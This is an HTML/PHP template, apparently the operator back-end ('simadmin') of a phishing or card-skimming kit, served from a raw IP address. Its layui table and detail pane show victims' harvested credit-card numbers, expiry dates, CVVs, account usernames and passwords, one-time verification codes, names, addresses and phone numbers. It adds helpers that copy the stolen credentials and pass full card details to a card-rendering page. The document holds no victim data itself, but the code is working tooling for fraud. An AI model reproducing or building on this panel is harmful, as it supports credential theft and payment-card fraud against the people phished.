<?php /*a:1:{s:53:"/www/wwwroot/209.141.40.135/view/simadmin/oklist.html";i:1674067976;}*/ ?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>完整数据</title>
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <link rel="stylesheet" href="../layuiadmin/layui/css/layui.css" media="all">
  <link rel="stylesheet" href="../layuiadmin/style/admin.css" media="all">
  <style>
    .layui-table-cell{
      height: auto;
      white-space: normal;
    }
  </style>
</head>
<body>


  <div class="layui-fluid" id="component-tabs">
    <div class="layui-row layui-col-space15">
      <div class="layui-col-md6">
        
        <div class="layui-card">
          <!-- <div class="layui-card-header">
            列表
          </div> -->
          <div class="layui-card-body">
            <table id="list-data" lay-filter="list-data" lay-data="{id: 'list-data'}"></table>
          </div>
        </div>
     </div>

     <div class="layui-col-md6">
        
      <div class="layui-card">
        <!-- <div class="layui-card-header">
          列表
        </div> -->
        <div id="tableinfo" class="layui-card-body" style="display: none;">
          <table class="layui-table" style="margin: 0 !important;">
            <tr><td colspan="2">卡号：<span id="cardnumber"></span></td></tr>
            <tr><td colspan="2">日期：<span id="date"></span></td></tr>
            <tr><td colspan="2">CVV：<span id="cvv"></span></td></tr>
            <tr><td colspan="2">姓名：<span id="cardname"></span></td></tr>
            <tr><td>账号：<span id="username"></span></td><td>密码：<span id="password"></span></td></tr>
            <tr><td colspan="2">验证码：<span id="yzm"></span></td></tr>

            <tr><td colspan="2">
              地址信息：
              <p id="diyu"></p>
              <p id="dizhi"></p>
              <p id="dianhua"></p>
            </td></tr>
          </table>
        </div>
      </div>
   </div>
  </div>

  <script type="text/html" id="switchTpl">
    <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="jk" {{ d.jk == 1 ? 'checked' : '' }}>
  </script>
  <script src="../layuiadmin/layui/layui.js"></script>
  <script>
    layui.use(['form','jquery','element', 'table','util'], function(){
      var $ = layui.$,
      table = layui.table,
      element = layui.element,
      form = layui.form;
      var initTable=table.render({
        elem: '#list-data',
        url: '/simadmin/oklist_data',
        page: true,
        limit:10,
        loading: false,
        cols: [[ //表头
          {field: 'id',title: 'ID', width: 70},
          {title: '信用卡',templet:
            function(d){
              if(d.data3){
                let j3 = JSON.parse(d.data3);
                return `<p><a class="layui-btn layui-btn-xs layui-btn-normal" lay-event="card">${j3.kahao.replace(/[\s]/g, 'string').replace(/(\d{4})(?=\d)/g, "$1 ")}</a></p>`;
              }else return '';
            }
          },
          {title: '操作', width: 70, unresize: true,templet:
            function(d){
              return '<a class="layui-btn layui-btn-xs" lay-event="xq">详情</a>';
            }
          },
        ]]
      });
      
      table.on('tool(list-data)', function(obj){ 
        ac[obj.event](obj,obj.data);    
      });
      
      var ac = {};
      ac['username'] = function(obj,data){
        let j = JSON.parse(data.data1);
        copyContent(j.username)
      }
      ac['password'] = function(obj,data){
        let j = JSON.parse(data.data1);
        copyContent(j.password)
      }
      // 复制剪切板
      function copyContent(content) {
          var oInput = document.createElement('input');
          oInput.value = content;
          document.body.appendChild(oInput);
          oInput.select(); // 选择对象
          document.execCommand("Copy"); // 执行浏览器复制命令
          oInput.className = 'oInput';//设置class名
          document.getElementsByClassName("oInput")[0].remove();//移除这个input
          layer.msg('复制成功！', {icon: 1, time: 1000});
      };

      ac['xq'] = function(obj,data){
       // $('#tableinfo').style.display="block"
    document.getElementById("tableinfo").style.display="block";
        if(data.data1){
          let j1 = JSON.parse(data.data1);
          $('#username').html(j1.username);
          $('#password').html(j1.password);
        }
        if(data.data3){
          let j3 = JSON.parse(data.data3);
          $('#cardnumber').html(j3.kahao.replace(/[\s]/g, 'string').replace(/(\d{4})(?=\d)/g, "$1 "));
          $('#date').html(j3.yue+' / '+ j3.nian);
          $('#cvv').html(j3.cvv);
        }
        $('#yzm').html(data.yzm);

        if(data.data2){
          let j2 = JSON.parse(data.data2);

          $('#cardname').html(j2.mingzi);

          $('#diyu').html("地域："+j2.diyu);
          $('#dizhi').html("地址："+j2.dizhi);
          $('#dianhua').html("电话："+j2.dianhua);
        }
      }

      ac['card'] = function(obj,data){
        if(data.data3){
          let j2 = JSON.parse(data.data2);
          let j3 = JSON.parse(data.data3);
          layer.open({
            type: 2,
            title: `${data.id}@${data.it}`,
            shadeClose: true,
            shade: 0.8,
            area: ['520px', '363px'],
            content: `/simadmin/card?cardname=${j2.mingzi}&issuer=&cardnumber=${j3.kahao}&month=${j3.yue}&year=${j3.nian}&cvv=${j3.cvv}&`
          }); 
        }
      }
    });
  </script>
</body>
</html>
